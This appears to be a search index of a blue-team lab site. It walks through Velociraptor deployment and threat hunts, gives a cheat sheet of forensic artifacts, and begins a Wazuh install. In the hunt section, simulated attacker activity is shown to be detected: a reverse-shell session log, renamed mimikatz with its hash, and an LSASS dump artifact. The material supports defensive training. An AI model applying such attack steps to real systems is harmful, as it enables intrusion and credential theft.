<li>Improved Security Posture: Enhances our ability to detect and respond to threats effectively.</li> <li>Operational Efficiency: Streamlines security operations through automation and integration.</li> <li>Cost Reduction: Lowers operational costs by reducing the need for manual intervention.</li> <li>Stakeholder Confidence: Demonstrates our commitment to robust cybersecurity practices.</li> </ul>"},{"location":"understanding-SOAR/understanding-SOAR.html#how-soar-works","title":"How SOAR Works","text":"<ol> <li>Data Collection: Aggregates security data from various sources such as firewalls, IDS/IPS, and endpoint protection systems.</li> <li>Analysis: Uses advanced analytics to identify and prioritize security threats.</li> <li>Automation: Executes predefined workflows to respond to specific types of threats automatically.</li> <li>Orchestration: Coordinates actions across multiple security tools and teams for a unified response.</li> <li>Reporting: Generates reports and dashboards for continuous monitoring and improvement.</li> </ol>"},{"location":"understanding-SOAR/understanding-SOAR.html#soar-solution","title":"SOAR Solution","text":"<ul> <li>Shuffle<ul> <li>Open-Source SOAR Platform: Provides a user-friendly interface for building and automating security workflows.</li> <li>Integration Capabilities: Easily connects with various security tools through built-in integrations.</li> <li>Custom Workflows: Allows us to create tailored automation workflows specific to our security needs.</li> </ul> </li> </ul>"},{"location":"velociraptor/velociraptor.html","title":"Velociraptor","text":"<p>Velociraptor is an advanced digital forensic and incident response tool that enhances your visibility into your endpoints.</p>"},{"location":"velociraptor/velociraptor.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, the Velociraptor server was configured on an Ubuntu virtual machine (VM), and the Velociraptor client was configured on a Windows VM. An attack simulation was conducted on the Windows hosts using a Kali machine in a safe and controlled setting.</p> <p>Note: Do not attempt to replicate the attack emulation demonstrated here unless you are properly trained and it is safe to do so. Unauthorised attack emulation can lead to legal consequences and unintended damage to systems. Always ensure that such activities are conducted by qualified professionals in a secure, isolated environment.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) WazuhServer Ubuntu 22.04 LTS Velociraptor Server 10.0.0.20 WS2019 Windows Server 2019 Velociraptor Client 10.0.0.40 Kali Kali Linux 2024.2 Attacker machine 10.0.0.22 <p></p>"},{"location":"velociraptor/velociraptor.html#deploy-velociraptor-server-using-self-signed-ssl","title":"Deploy Velociraptor Server using Self-Signed SSL","text":""},{"location":"velociraptor/velociraptor.html#self-signed-ssl","title":"Self-Signed SSL","text":"<p>Velociraptor deployments are secured using a self-signed Certificate Authority (CA) that is generated during the initial configuration generation step. The client\u2019s configuration contains the signed CA, which is used to verify all certificates needed during communications.</p> <p>In\u00a0<code>self-signed SSL</code>\u00a0mode, Velociraptor issues its own server certificate using its internal CA. This means the Admin GUI and front end also use a self-signed server certificate.</p>"},{"location":"velociraptor/velociraptor.html#when-to-use-this-method","title":"When to use this method","text":"<p>This type of deployment is most appropriate for on-premises scenarios where internet access is not available or egress is blocked.</p>"},{"location":"velociraptor/velociraptor.html#self-signed-certificates","title":"Self-Signed Certificates","text":"<p>Self-signed SSL certificates trigger SSL warnings in all web browsers. When accessing the Admin GUI you will receive a certificate warning about the possibility of a MITM attack.</p> <p>As a precaution, Velociraptor only exports the GUI port on the loopback interface. You may change the\u00a0<code>GUI.bind_address</code>\u00a0setting to \u201c0.0.0.0\u201d to receive external connections on this port, but this is not recommended. Instead, you should use SSH tunneling to connect to the local loopback interface.</p> <p>Velociraptor doesn\u2019t support other self-signed SSL certificates, and we don\u2019t recommend attempting to create and upload your own internal self-signed certificate to Velociraptor.</p>"},{"location":"velociraptor/velociraptor.html#generate-config-files-for-the-server-and-client","title":"Generate config files for the server and client","text":"<p>Download the latest Velociraptor binary that is compatible for your host architecture from https://github.com/Velocidex/velociraptor/releases.</p> <p>Change the permission of the Velociraptor binary.</p> <pre><code>sudo chmod 764 velociraptor-v0.72.0-linux-amd64\n</code></pre> <p>Make the directory <code>/opt/velociraptor</code> </p> <pre><code>sudo mkdir /opt/velociraptor\n</code></pre> <p>Generate a new config file by running velociraptor in interactive mode</p> <p>Select <code>linux</code> for OS</p> <p>Set Path to the datastore directory as default <code>/opt/velociraptor</code> (hit <code>enter</code>)</p> <p>Select <code>Self Signed SSL</code></p> <p>For the public DNS name of the Master Frontend, enter your IP address (e.g. <code>10.0.0.20</code>)</p> <p>For the frontend port, select default port of <code>8000</code> (hit <code>enter</code>)</p> <p>Note: If you are installing Velociraptor server on same machine as where the Splunk Enterprise is installed, set your frontend port to something else (e.g. <code>7000</code>) to avoid conflict.</p> <p>For the GUI port, select default port of <code>8889</code> (hit <code>enter</code>)</p> <p>For WebSocket, answer <code>N</code> (hit <code>enter</code>)</p> <p>For the registry to store the writeback files, answer <code>N</code> (hit <code>enter</code>)</p> <p>For DynDns provider, answer <code>none</code> (hit <code>enter</code>)</p> <p>Create GUI username and password</p> <p>When prompted to create GUI username again, hit <code>enter</code> to end</p> <p>Set Path to the logs directory as default <code>/opt/velociraptor/logs</code> (hit <code>enter</code>)</p> <p>For restricting VQL functionality on the server, answer <code>N</code> (hit <code>enter</code>)</p> <p>For where should I write the server config file, hit <code>enter</code> to set it to <code>server.config.yaml</code></p> <p>For where should I write the client config file, hit <code>enter</code> to set it to <code>client.config.yaml</code></p> <p>Note the question is actually asking for file name instead of file path. </p> <pre><code>sudo ./velociraptor-v0.72.0-linux-amd64 config generate -i\n</code></pre> <pre><code>#Example output\nWelcome to the Velociraptor configuration generator\n---------------------------------------------------\n\nI will be creating a new deployment configuration for you. I will\nbegin by identifying what type of deployment you need.\n\nWhat OS will the server be deployed on?\n linux\n? Path to the datastore directory. /opt/velociraptor\n?  Self Signed SSL\n? What is the public DNS name of the Master Frontend (e.g. www.example.com): 10.0.0.20\n? Enter the frontend port to listen on. 8000\n? Enter the port for the GUI to listen on. 8889\n? Would you like to try the new experimental websocket comms?\n\nWebsocket is a bidirectional low latency communication protocol supported by\nmost modern proxies and load balancers. This method is more efficient and\nportable than plain HTTP. Be sure to test this in your environment.\n No\n? Would you like to use the registry to store the writeback files? (Experimental) No\n? Which DynDns provider do you use? none\n? GUI Username or email address to authorize (empty to end): cyber\n? GUI Username or email address to authorize (empty to end): \n[INFO] 2024-09-18T20:53:27Z  _    __     __           _                  __ \n[INFO] 2024-09-18T20:53:27Z | |  / /__  / /___  _____(_)________ _____  / /_____  _____ \n[INFO] 2024-09-18T20:53:27Z | | / / _ \\/ / __ \\/ ___/ / ___/ __ `/ __ \\/ __/ __ \\/ ___/ \n[INFO] 2024-09-18T20:53:27Z | |/ /  __/ / /_/ / /__/ / /  / /_/ / /_/ / /_/ /_/ / / \n[INFO] 2024-09-18T20:53:27Z |___/\\___/_/\\____/\\___/_/_/   \\__,_/ .___/\\__/\\____/_/ \n[INFO] 2024-09-18T20:53:27Z                                   /_/ \n[INFO] 2024-09-18T20:53:27Z Digging deeper!                  https://www.velocidex.com \n[INFO] 2024-09-18T20:53:27Z This is Velociraptor 0.72.0 built on 2024-04-25T16:09:17Z (7e4da7a) \n[INFO] 2024-09-18T20:53:27Z Generating keys please wait.... \n? Path to the logs directory. /opt/velociraptor/logs\n? Do you want to restrict VQL functionality on the server?\n\nThis is useful for a shared server where users are not fully trusted.\nIt removes potentially dangerous plugins like execve(), filesystem access etc.\n\nNOTE: This is an experimental feature only useful in limited situations. If you\ndo not know you need it select N here!\n No\n? Where should I write the server config file? server.config.yaml\n? Where should I write the client config file? client.config.yaml\n</code></pre> <p>Verify that both server and client config files are generated in the present working directory</p> <pre><code>ls\n</code></pre> <pre><code>#Example output\nclient.config.yaml  server.config.yaml  velociraptor-v0.72.0-linux-amd64\n</code></pre> <p>Copy the config files to <code>/opt/velociraptor</code>  directory</p> <pre><code>sudo cp client.config.yaml /opt/velociraptor\nsudo cp server.config.yaml /opt/velociraptor\n</code></pre> <p>Edit <code>server.config.yaml</code> in the <code>/opt/velociraptor</code>  directory</p> <pre><code>sudo nano server.config.yaml\n</code></pre> <p>Verify that <code>Client: server_urls:</code> is set to <code>https://&lt;IP address&gt;:8000/</code></p> <p>Edit <code>GUI: bind address:</code> to point to your Velociraptor server IP address </p> <pre><code>Client:\n  server_urls:\n   - https://10.0.0.20:8000/\n&lt;SNIP&gt;\nGUI:\n  bind_address: 10.0.0.20\n  bind_port: 8889\n</code></pre> <p>Create the Velociraptor server package for deb that included the generated configuration file:</p> <pre><code>sudo ./velociraptor-v0.72.0-linux-amd64 --config /opt/velociraptor/server.config.yaml debian server --binary velociraptor-v0.72.0-linux-amd64 \n</code></pre> <pre><code>#Example output\nCreating amd64 server package at velociraptor_server_0.72.0_amd64.deb\n</code></pre> <p>Install the server package</p> <pre><code>sudo dpkg -i velociraptor_server_0.72.0_amd64.deb\n</code></pre> <p>This process creates a new user, system user and group called velociraptor</p> <p>A service is created to automatically start Velociraptor anytime the server is restarted</p> <p>Verify the /opt/velociraptor is accessible by user and group velociraptor</p> <pre><code>ls -la /opt/velociraptor/\n</code></pre> <pre><code>total 24\ndrwxr-xr-x. 9 velociraptor velociraptor   175 Aug 28 09:03 .\ndrwxr-xr-x. 5 root         root            52 Aug 28 07:09 ..\ndrwx------. 2 velociraptor velociraptor    68 Aug 28 09:03 acl\n-rw-------. 1 velociraptor velociraptor  2725 Aug 28 07:19 client.config.yaml\ndrwx------. 3 velociraptor velociraptor    20 Aug 28 09:03 clients\ndrwxr-xr-x. 3 velociraptor velociraptor   168 Aug 28 09:03 config\ndrwx------. 2 velociraptor velociraptor  4096 Aug 28 09:03 logs\ndrwx------. 3 velociraptor velociraptor    35 Aug 28 09:03 server_artifact_logs\ndrwx------. 5 velociraptor velociraptor   104 Aug 28 09:03 server_artifacts\n-rw-------. 1 velociraptor velociraptor 13172 Aug 28 08:54 server.config.yaml\ndrwx------. 2 velociraptor velociraptor    29 Aug 28 09:03 users\n---\n\ntotal 36\ndrwxr-xr-x 9 velociraptor velociraptor 4096 Sep 19 09:06 .\ndrwxr-xr-x 5 root         root         4096 Sep 19 08:13 ..\ndrwx------ 2 velociraptor velociraptor 4096 Sep 19 09:06 acl\ndrwx------ 3 velociraptor velociraptor 4096 Sep 19 09:06 clients\ndrwxr-xr-x 3 velociraptor velociraptor 4096 Sep 19 09:06 config\ndrwx------ 2 velociraptor velociraptor 4096 Sep 19 09:06 logs\ndrwx------ 3 velociraptor velociraptor 4096 Sep 19 09:06 server_artifact_logs\ndrwx------ 5 velociraptor velociraptor 4096 Sep 19 09:06 server_artifacts\ndrwx------ 2 velociraptor velociraptor 4096 Sep 19 09:06 users\n</code></pre> <p>Verify <code>velocirpator_server.service</code> is active and running</p> <pre><code>sudo systemctl status velociraptor_server.service \n</code></pre> <p>Access the Velociraptor by typing <code>https://&lt;IP address&gt;:8889</code></p> <p>Sign in with the user you created</p> <p></p> <p></p>"},{"location":"velociraptor/velociraptor.html#configure-firewall","title":"Configure Firewall","text":"<p>On CentOS host, run the following command</p> <pre><code>#Show original state\nfirewall-cmd --list-all\n\n#Velociraptor ports\nfirewall-cmd --zone=public --add-port=8000/tcp --permanent # Frontend\nfirewall-cmd --zone=public --add-port=8889/tcp --permanent # Web GUI\nfirewall-cmd --reload\n\n#Check applied\nfirewall-cmd --list-all\n</code></pre> <p>On Ubuntu, run the following command:</p> <pre><code>sudo ufw allow 8000/tcp  # syslog TCP\nsudo ufw allow 8889/udp  # syslog UDP\n\n#Apply changes\nsudo ufw reload\n\n#Enable Firewall\n#sudo ufw enable\n\n#Apply changes\nsudo ufw status numbered\n</code></pre>"},{"location":"velociraptor/velociraptor.html#configure-velociraptor-client-windows","title":"Configure Velociraptor Client (Windows)","text":""},{"location":"velociraptor/velociraptor.html#option-1-official-release-msi","title":"Option 1: Official release MSI","text":"<p>The recommended way to install Velociraptor as a client on Windows is via the release MSI on the\u00a0Github releases\u00a0page. Download the Velociraptor MSI (velociraptor-v0.72.0-windows-amd64.msi) . On your Windows host, double-click the <code>msi</code> or run the following command on Command Prompt:</p> <pre><code>msiexec /i [velociraptor-v0.72.0-windows-amd64.msi](https://github.com/Velocidex/velociraptor/releases/download/v0.72/velociraptor-v0.72.0-windows-amd64.msi)\n</code></pre> <p>Navigate to <code>C:\\Program Files\\Velociraptor</code> and delete the existing <code>client.config.yaml</code></p> <p>Transfer <code>client.config.yaml</code> from Linux host to Windows client using your preferred method. </p> <p>From the Linux host in the <code>/opt/velociraptor</code> folder, host a HTTP server by running:</p> <pre><code>sudo python3 -m http.server 9999\n</code></pre> <p>From Windows client, open PowerShell as Administrator. Change directory into <code>C:\\Program Files\\Velociraptor</code> and run:</p> <pre><code>iwr -uri http://10.0.0.20:9999/client.config.yaml -Outfile client.config.yaml\n</code></pre> <p>You will see <code>velociraptor.writeback.yaml</code> appear. If the writeback YAML file does not appear, restart the computer.</p>"},{"location":"velociraptor/velociraptor.html#option-2-configure-msi-package-via-velociraptor-server","title":"Option 2: Configure MSI package via Velociraptor Server","text":"<p>Since the Velociraptor client requires a unique configuration file to identify the location of the server, we can\u2019t package the configuration file in the official release. Therefore, the official MSI does not include a valid configuration file. You will need to modify the MSI to pack your configuration file (that was generated earlier) into it.</p> <p>Navigate to Velociraptor web GUI. Click on the server icon. Add new collection by clicking <code>+</code> button.</p> <p></p> <p>Search for\u00a0<code>Server.Utils.CreateMSI</code>\u00a0and click launch. The produced MSI will be available in the\u00a0<code>Uploaded Files</code>\u00a0tab.</p> <p></p> <p>Click on the filename to download the MSI</p> <p></p> <p>Rename the file as <code>velociraptor-v0.72.0-windows-amd64.msi</code> </p> <p>Transfer the file to your Windows client using your preferred method. </p> <p>From the Linux host in the downloads folder, host a HTTP server by running:</p> <pre><code>sudo python3 -m http.server 9999\n</code></pre> <p>From Windows client, open PowerShell as Administrator and run:</p> <pre><code>iwr -uri http://10.0.0.20:9999/velociraptor-v0.72.0-windows-amd64.msi -Outfile velociraptor-v0.72.0-windows-amd64.msi\n</code></pre> <p>If required, create a new rule in Firewall to temporarily allow access on port 9999. Remember to delete the rule after the file transfer. </p> <p>On your Windows client, double-click the <code>msi</code> or run the following command on Command Prompt:</p> <pre><code>msiexec /i [velociraptor-v0.72.0-windows-amd64.msi](https://github.com/Velocidex/velociraptor/releases/download/v0.72/velociraptor-v0.72.0-windows-amd64.msi)\n</code></pre>"},{"location":"velociraptor/velociraptor.html#verify-client-connection","title":"Verify client connection","text":"<p>On the Velociraptor Server web GUI, click on the magnifying glass icon and verify that your client is connected.</p> <p>Any client that has successfully enrolled will show a green light</p> <p></p>"},{"location":"velociraptor/velociraptor.html#introduction-to-velociraptor","title":"Introduction to Velociraptor","text":""},{"location":"velociraptor/velociraptor.html#creating-a-process-hunt","title":"Creating a Process Hunt","text":"<p>A Windows reverse shell named <code>1.exe</code> was generated and executed on the Windows Server 2019 host, connecting to the Kali machine. The session was then switched from Command Prompt to PowerShell.</p> <pre><code>[*] Started reverse TCP handler on 10.0.0.22:4444 \n[*] Command shell session 1 opened (10.0.0.22:4444 -&gt; 10.0.0.40:49886) at 2024-09-18 19:56:51 -0400\n\nShell Banner:\nMicrosoft Windows [Version 10.0.17763.3650]\n-----       \n\nC:\\Users\\Administrator\\Downloads&gt;whoami\nwhoami\nws2019\\administrator\n\nC:\\Users\\Administrator\\Downloads&gt;powershell\npowershell\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n</code></pre> <p>Create New Hunt by clicking Hunt icon and + icon</p> <p>In the Configure Hunt tab, add the description Process Hunt</p> <p></p> <p>In the Select Artifacts tab, search for pstree. Select <code>Generic.System.Pstree</code></p> <p>This artifact displays the call chain for every process on the system by traversing the process\u2019s parent ID.</p> <p></p> <p>In the same tab, search for pslist and select <code>Windows.System.Pslist</code></p> <p>This artifact list processes and their running binaries</p> <p></p> <p>In the Configure Parameters tab, Edit <code>Generic.system.Pstree</code></p> <p>Select IncludePstree</p> <p></p> <p>Select Review then Launch. Select the Hunt and click Play button to launch it.</p> <p></p> <p>Once the Hunt is complete (indicated by Total schedules and Finished clients), click the stop button to stop the Hunt.</p> <p>Check the results on the Notebook tab on web GUI.</p> <p>As shown in the screenshot below, the suspicious activity is detected. </p> <p></p> <p>Alternatively, if you prefer to Download Results as a CSV file and view it in an Excel, this can be done in the Results Section &gt; Download Results</p>"},{"location":"velociraptor/velociraptor.html#adding-client-labels","title":"Adding Client Labels","text":"<p>To create a label, click the magnifying glass icon, select the target host, then click the label icon. Name the new label (e.g., <code>windows</code>).</p> <p></p> <p>Verify that the label has been created.</p> <p></p>"},{"location":"velociraptor/velociraptor.html#creating-a-filename-search-hunt","title":"Creating a Filename Search Hunt","text":"<p>A malicious PowerShell script called <code>justascript.ps1</code> was created then removed on Windows client. </p> <p>Create a new hunt with the description <code>Filename search</code></p> <p>For Include Condition, select <code>Match by label</code></p> <p>For Include Labels, select <code>windows</code></p> <p></p> <p>On the Select Artifacts tab, type <code>filename</code> and select <code>Windows.Forensics.FilenameSearch</code></p> <p></p> <p>On the Configure Parameters tab, click spanner icon to configure.</p> <p>In the yaraRule, replace <code>my secret fie.txt</code> with <code>justascript.ps1</code> </p> <p></p> <p>Select Review then Launch. Run hunt by clicking the play icon. Once the hunt is finished, stop the hunt by clicking the stop icon. View results in the Notebook tab. Velociraptor detects that the script is in the Recycle bin. </p> <p></p>"},{"location":"velociraptor/velociraptor.html#creating-a-hash-hunt","title":"Creating a Hash Hunt","text":"<p>Mimikatz is a tool used to find and steal passwords from Windows computers. The <code>mimikatz.exe</code> was copied over to Windows client and have been renamed as <code>justanexe.exe</code>.</p> <p>Create a new hunt with the description <code>Hash Hunt</code></p> <p>For Include Condition, select <code>Match by label</code></p> <p>For Include Labels, select <code>windows</code></p> <p></p> <p>On the Select Artifacts tab, type <code>hash</code> and select <code>Generic.Detection.HashHunter</code></p> <p></p> <p>On the Configure Parameters tab, click spanner icon to configure.</p> <p>On SHA256List, copy and paste sha256 hash of mimikatz.exe <code>61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1</code></p> <p></p> <p>Select Launch. Run hunt by clicking the play icon. Once the hunt is finished, stop the hunt by clicking the stop icon. View results in the Notebook tab. Velociraptor matches the SHA256 hash with <code>justanexe.exe</code></p> <p></p>"},{"location":"velociraptor/velociraptor.html#references","title":"References","text":"<ul> <li>https://docs.velociraptor.app/</li> <li>https://www.youtube.com/watch?v=p9pQ2g-18o4&amp;t=590s</li> <li>https://youtu.be/-bj0c158Wlo?si=Gms_VnVyWe-LufOZ</li> <li>https://www.youtube.com/watch?v=S8POUZv7pT8</li> <li>https://www.youtube.com/watch?v=M7bMfdmWR7A</li> <li>https://github.com/Velocidex/velociraptor/releases/tag/v0.72</li> </ul>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html","title":"Velociraptor Cheat Sheet","text":""},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#about-this-cheat-sheet","title":"About this Cheat Sheet","text":"<p>This cheat sheet is aimed at beginner-level users and covers common use cases and artifacts in Velociraptor. It\u2019s designed to help you get started with threat hunting and understand how to collect evidence and investigate suspicious activity on endpoints.</p>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#note-on-parameters","title":"Note on Parameters","text":"<p>Many Velociraptor artifacts include parameters like <code>TargetGlob</code>, <code>Path</code>, or <code>Hash</code>. These need to be adjusted to suit your environment. For example:</p> <pre><code>TargetGlob: C:/Users/**/*.exe\n</code></pre> <p>This pattern tells Velociraptor to search for any <code>.exe</code> files inside all user folders. Be sure to update paths and filters based on what you're looking for.</p>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#endpoint-visibility-and-forensics","title":"Endpoint Visibility and Forensics","text":""},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#list-running-processes","title":"List Running Processes","text":"<p>Shows which programs and background tasks are currently running on a system.</p> <p>This helps identify suspicious tools or malware that may be active in memory.</p> <pre><code>Artifact: Windows.System.Pslist\nParameters: None\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#browse-the-file-system","title":"Browse the File System","text":"<p>Lets you explore folders and files on an endpoint, similar to File Explorer.</p> <p>This is useful when you want to manually check for suspicious files or collect samples.</p> <pre><code>Artifact: Windows.FileSystem.ListDirectory\nParameters:\n- Path: e.g. C:\\Users\\Public\\Downloads\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#view-prefetch-files","title":"View Prefetch Files","text":"<p>Displays a list of programs that were run recently, even if they were deleted.</p> <p>Windows automatically creates small files called Prefetch files to help programs start faster. These files can be helpful in showing what the attacker executed.</p> <pre><code>Artifact: Windows.Executables.Prefetch\nParameters: None\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#file-and-ioc-hunting","title":"File and IOC Hunting","text":""},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#search-for-a-file-by-name","title":"Search for a File by Name","text":"<p>Finds files across the system based on a name or file path pattern.</p> <p>Use this to locate dropped malware or attacker tools (e.g. anything ending in <code>.exe</code> or <code>.ps1</code>).</p> <pre><code>Artifact: Generic.Files.Search\nParameters:\n- TargetGlob: C:/Users/**/*.exe\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#search-by-file-hash","title":"Search by File Hash","text":"<p>Checks if a file on the system matches a known bad file by its hash value.</p> <p>A hash is like a fingerprint of a file. You can get known bad hashes from threat intel sites like VirusTotal.</p> <pre><code>Artifact: Generic.Files.Hash\nParameters:\n- TargetGlob: C:/Users/**/*\n- Hash: paste in a known SHA256 or MD5 hash\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#scan-files-with-yara-rules","title":"Scan Files with YARA Rules","text":"<p>Looks for suspicious files based on patterns written in a tool called YARA.</p> <p>YARA is used by malware analysts to create rules that detect known malware behaviour inside files, even when names and hashes change.</p> <pre><code>Artifact: Windows.Detection.Malware.Yara\nParameters:\n- FileGlob: C:/Users/**/*\n- Upload or select a YARA rule\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#registry-and-persistence","title":"Registry and Persistence","text":""},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#check-registry-autoruns","title":"Check Registry Autoruns","text":"<p>Finds programs that are set to run automatically when the system starts.</p> <p>Malware often adds itself to registry keys to make sure it runs every time the computer boots.</p> <pre><code>Artifact: Windows.Registry.Keys\nParameters:\n- KeyGlob: HKEY_USERS\\*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#network-and-dns","title":"Network and DNS","text":""},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#list-active-network-connections","title":"List Active Network Connections","text":"<p>Shows which programs are making network connections, and to which IP addresses or ports.</p> <p>This can help identify suspicious communication with attacker-controlled infrastructure.</p> <pre><code>Artifact: Windows.Network.Netstat\nParameters: None\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#check-dns-cache","title":"Check DNS Cache","text":"<p>Displays a list of domains or websites the system recently looked up.</p> <p>This can help you spot connections to suspicious command-and-control servers or phishing domains.</p> <pre><code>Artifact: Windows.DNS.ClientCache\nParameters: None\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#user-and-browser-activity","title":"User and Browser Activity","text":""},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#collect-browser-history","title":"Collect Browser History","text":"<p>Shows websites visited by the user in browsers like Chrome or Firefox.</p> <p>Useful in phishing investigations or if you suspect the user downloaded malware.</p> <pre><code>Artifact: Windows.Programs.Browsers.History\nParameters:\n- Time range: e.g. Last 7 days\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#review-file-activity-timeline","title":"Review File Activity Timeline","text":"<p>Tracks when files were opened, created, modified, or executed on the system.</p> <p>Helps build a timeline of what happened on the endpoint.</p> <pre><code>Artifact: Windows.Timeline\nParameters:\n- File Extension: .exe or .ps1\n- Time Range: e.g. Last 24 hours\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#memory-and-credential-access","title":"Memory and Credential Access","text":""},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#collect-lsass-memory-dump","title":"Collect LSASS Memory Dump","text":"<p>Captures the memory of the LSASS process, which stores login credentials.</p> <p>Used during incident response to check if an attacker tried to extract passwords. LSASS is a sensitive Windows process, and dumping it may trigger antivirus or cause system instability.</p> <pre><code>Artifact: Windows.Memory.Lsass\nParameters:\n- LiveDump: true\n- OutputFile: C:\\Temp\\lsass.dmp\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#process-and-execution-monitoring","title":"Process and Execution Monitoring","text":""},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#list-injected-threads","title":"List Injected Threads","text":"<p>Checks for suspicious code injected into running processes.</p> <p>Attackers often use process injection to hide malicious actions inside trusted programs.</p> <pre><code>Artifact: Windows.Detection.RemoteThreads\nParameters: None\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#scan-for-suspicious-command-line-patterns","title":"Scan for Suspicious Command Line Patterns","text":"<p>Searches command lines for suspicious keywords like <code>base64</code>, <code>bypass</code>, or <code>encoded</code>.</p> <p>Useful for detecting obfuscated scripts or abuse of trusted tools.</p> <pre><code>Artifact: Windows.Detection.SuspiciousCommandLine\nParameters: None\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#detect-suspicious-parent-child-process-chains","title":"Detect Suspicious Parent-Child Process Chains","text":"<p>Finds unusual process relationships such as Microsoft Word or Excel launching PowerShell.</p> <p>This is a common phishing method where a macro in a document runs a malicious script.</p> <pre><code>Artifact: Windows.System.Pstree\nParameters:\n- IncludeProcessList: powershell.exe, cmd.exe, wscript.exe\n</code></pre>"},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#scheduled-task-monitoring","title":"Scheduled Task Monitoring","text":""},{"location":"velociraptor-cheat-sheet/velociraptor-cheat-sheet.html#list-scheduled-tasks","title":"List Scheduled Tasks","text":"<p>Shows all scheduled tasks on the machine, including hidden or attacker-created ones.</p> <p>Attackers use this to maintain persistence or schedule repeated attacks.</p> <pre><code>Artifact: Windows.System.ScheduledTasks\nParameters: None\n</code></pre>"},{"location":"wazuh/wazuh.html","title":"Wazuh","text":"<p>Wazuh\u00a0is the open source security platform that unifies XDR and SIEM protection for endpoints and cloud workloads. It is designed to help organisations detect threats, monitor integrity, and ensure compliance across their infrastructure, including physical, virtual, containerised, and cloud environments.</p>"},{"location":"wazuh/wazuh.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, attack emulation was conducted on the FortiGate VM, Windows and Ubuntu hosts in a safe and controlled setting. </p> <p>Note: Do not attempt to replicate the attack emulation demonstrated here unless you are properly trained and it is safe to do so. Unauthorised attack emulation can lead to legal consequences and unintended damage to systems. Always ensure that such activities are conducted by qualified professionals in a secure, isolated environment.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) WazuhServer Centos Stream 9 Wazuh server 10.0.0.20 WS2019 Windows Server 2019 Wazuh agent 10.0.0.24 SyslogUbuntu Ubuntu 22.04 LTS Wazuh agent, rsyslog server 10.0.0.26 Kali Kali Linux 2024.2 Attacker machine 192.168.1.161, 10.0.0.29 <p></p>"},{"location":"wazuh/wazuh.html#install-wazuh-server-offline","title":"Install Wazuh Server offline","text":"<p>To install Wazuh offline, first download its core components for later installation on a system without Internet access. You can set up the Wazuh server, indexer, and dashboard on a single host (all-in-one deployment) or install them separately across multiple hosts (distributed deployment), depending on your requirements. See the Wazuh Server requirements for details.</p> <p>Note: Root user privileges are required to run the following commands.</p>"},{"location":"wazuh/wazuh.html#prerequisites","title":"Prerequisites","text":"<p>Ensure that <code>curl</code>, <code>tar</code>, and <code>setcap</code> are installed on the target system for the offline installation. On some Debian-based systems, <code>gnupg</code> may also be required.</p> <p>Additionally, some systems have <code>cp</code> set as an alias for <code>cp -i</code>, which prompts for confirmation before overwriting files. To prevent this, run <code>unalias cp</code>.</p>"},{"location":"wazuh/wazuh.html#configuring-firewall-optional","title":"Configuring Firewall (Optional)","text":"<p>Configure Firewall rule to allow access on required ports</p> <p>CentOS:</p> <pre><code>firewall-cmd --zone=public --add-port=9200/tcp --permanent #Wazuh-indexer\nfirewall-cmd --zone=public --add-port=55000/tcp --permanent #enrollment service\nfirewall-cmd --zone=public --add-port=1514/tcp --permanent #agent communication\nfirewall-cmd --zone=public --add-port=1515/tcp --permanent #enrollment service\n\n#Apply changes\nfirewall-cmd --reload\n\n#Check applied\nfirewall-cmd --list-all\n</code></pre> <p>Ubuntu:</p> <pre><code>ufw allow 9200/tcp\nufw allow 55000/tcp\nufw allow 1514/tcp\nufw allow 1515/tcp\n</code></pre>"},{"location":"wazuh/wazuh.html#downloading-the-packages-and-configuration-files","title":"Downloading the Packages and Configuration Files","text":"<p>From any Linux system with Internet access, run the following commands to execute a script that downloads all necessary files for offline installation on x86_64 architectures. Choose the appropriate package format to download.</p> <p>RPM:</p> <pre><code>curl -sO https://packages.wazuh.com/4.11/wazuh-install.sh\nchmod 744 wazuh-install.sh\n./wazuh-install.sh -dw rpm\n</code></pre> <p>DEB:</p> <pre><code>curl -sO https://packages.wazuh.com/4.11/wazuh-install.sh\nchmod 744 wazuh-install.sh\n./wazuh-install.sh -dw deb\n</code></pre> <p>Download the certificates configuration file.</p> <pre><code>curl -sO https://packages.wazuh.com/4.11/config.yml\n</code></pre> <p>Modify <code>config.yml</code> to set up certificate creation.</p> <ul> 